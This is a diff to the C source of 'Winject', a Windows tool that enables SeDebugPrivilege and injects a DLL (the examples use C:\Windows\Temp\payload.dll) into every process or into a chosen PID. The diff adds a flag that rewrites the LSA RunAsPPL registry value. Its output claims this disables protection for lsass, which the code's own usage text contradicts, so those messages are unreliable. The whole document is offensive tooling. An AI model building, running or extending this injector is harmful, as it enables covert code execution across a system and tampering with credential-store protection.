@@ -1,8 +1,7 @@
 #include <windows.h>
 #include <tlhelp32.h>
 #include <stdio.h>
-
-// ─── Privilege ───────────────────────────────────────────────────────────────
+#include <stdlib.h>
 
 BOOL EnableDebugPrivilege() {
     HANDLE token;
@@ -44,7 +43,43 @@ BOOL EnableDebugPrivilege() {
     return TRUE;
 }
 
-// ─── Injection Task (per thread) ─────────────────────────────────────────────
+BOOL SetRunAsPPL() {
+    HKEY hKey;
+    DWORD dwValue = 2;
+    LONG lResult;
+
+    lResult = RegOpenKeyExW(
+        HKEY_LOCAL_MACHINE,
+        L"SYSTEM\\CurrentControlSet\\Control\\Lsa",
+        0,
+        KEY_SET_VALUE | KEY_WOW64_64KEY,
+        &hKey
+    );
+
+    if (lResult != ERROR_SUCCESS) {
+        printf("[-] Failed to open LSA registry key. Error: %lu\n", lResult);
+        return FALSE;
+    }
+
+    lResult = RegSetValueExW(
+        hKey,
+        L"RunAsPPL",
+        0,
+        REG_DWORD,
+        (const BYTE*)&dwValue,
+        sizeof(dwValue)
+    );
+
+    if (lResult != ERROR_SUCCESS) {
+        printf("[-] Failed to set RunAsPPL. Error: %lu\n", lResult);
+        RegCloseKey(hKey);
+        return FALSE;
+    }
+
+    printf("[+] Successfully disabled PPL for lsass. Reboot required.\n");
+    RegCloseKey(hKey);
+    return TRUE;
+}
 
 typedef struct {
     DWORD   pid;
@@ -127,8 +162,6 @@ DWORD WINAPI InjectionThread(LPVOID lpParam) {
     return 0;
 }
 
-// ─── Helpers ─────────────────────────────────────────────────────────────────
-
 void GetProcessName(DWORD pid, wchar_t* outName, size_t outLen) {
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snapshot == INVALID_HANDLE_VALUE) {
@@ -160,7 +193,6 @@ HANDLE SpawnInjectionThread(DWORD pid, const wchar_t* name,
 
     task->pid = pid;
 
-    // safe copies — always null terminate, abort on overflow
     wcscpy_s(task->name, MAX_PATH, name);
     strcpy_s(task->dllPath, MAX_PATH, dllPath);
 
@@ -168,8 +200,6 @@ HANDLE SpawnInjectionThread(DWORD pid, const wchar_t* name,
     if (!hThread) free(task);
     return hThread;
 }
-
-// ─── Single PID inject ────────────────────────────────────────────────────────
 
 void InjectSinglePID(DWORD pid, const char* dllPath) {
     printf("[*] Targeting single PID: %lu\n", pid);
@@ -189,8 +219,6 @@ void InjectSinglePID(DWORD pid, const char* dllPath) {
     WaitForSingleObject(hThread, INFINITE);
     CloseHandle(hThread);
 }
-
-// ─── Systemwide parallel inject ───────────────────────────────────────────────
 
 #define MAX_PROCESSES 1024
 
@@ -246,20 +274,24 @@ void InjectAllProcesses(const char* dllPath) {
     printf("[*] All injection threads finished\n");
 }
 
-// ─── Entry Point ─────────────────────────────────────────────────────────────
-
 void PrintUsage() {
     printf("Usage:\n");
-    printf("  Winject.exe <dll>             -- inject into all processes\n");
-    printf("  Winject.exe <dll> -pid <PID>  -- inject into specific PID\n");
+    printf("  Winject.exe <dll>                    -- inject into all processes\n");
+    printf("  Winject.exe <dll> -pid <PID>         -- inject into specific PID\n");
+    printf("  Winject.exe <dll> -ppl               -- also set LSA RunAsPPL=2\n");
+    printf("  Winject.exe <dll> -pid <PID> -ppl    -- single PID + RunAsPPL\n");
+    printf("\nFlags:\n");
+    printf("  -pid <PID>   Target a single process by PID\n");
+    printf("  -ppl         Set HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL = 2\n");
     printf("\nExamples:\n");
     printf("  Winject.exe C:\\Windows\\Temp\\payload.dll\n");
     printf("  Winject.exe C:\\Windows\\Temp\\payload.dll -pid 1234\n");
+    printf("  Winject.exe C:\\Windows\\Temp\\payload.dll -ppl\n");
 }
 
 int main(int argc, char* argv[]) {
-    printf("Winject\n");
-    printf("-------\n");
+    printf("Winject (8.1-11)\n");
+    printf("----------------\n");
 
     if (argc < 2) {
         PrintUsage();
@@ -269,6 +301,7 @@ int main(int argc, char* argv[]) {
     const char* dllPath = argv[1];
     DWORD       targetPid = 0;
     BOOL        singleMode = FALSE;
+    BOOL        setPPL = FALSE;
 
     for (int i = 2; i < argc; i++) {
         if (_stricmp(argv[i], "-pid") == 0) {
@@ -281,6 +314,9 @@ int main(int argc, char* argv[]) {
             singleMode = TRUE;
             i++;
         }
+        else if (_stricmp(argv[i], "-ppl") == 0) {
+            setPPL = TRUE;
+        }
     }
 
     printf("[*] DLL path: %s\n", dllPath);
@@ -290,6 +326,9 @@ int main(int argc, char* argv[]) {
     else
         printf("[*] Mode: systemwide\n");
 
+    if (setPPL)
+        printf("[*] RunAsPPL: will be set to 2\n");
+
     printf("[*] Enabling SeDebugPrivilege...\n");
 
     if (!EnableDebugPrivilege()) {
@@ -298,6 +337,14 @@ int main(int argc, char* argv[]) {
     }
 
     printf("[+] SeDebugPrivilege enabled\n\n");
+
+    if (setPPL) {
+        printf("[*] Setting LSA RunAsPPL registry key...\n");
+        if (!SetRunAsPPL()) {
+            printf("[!] Warning: could not set RunAsPPL (continuing anyway)\n");
+        }
+        printf("\n");
+    }
 
     if (singleMode)
         InjectSinglePID(targetPid, dllPath);
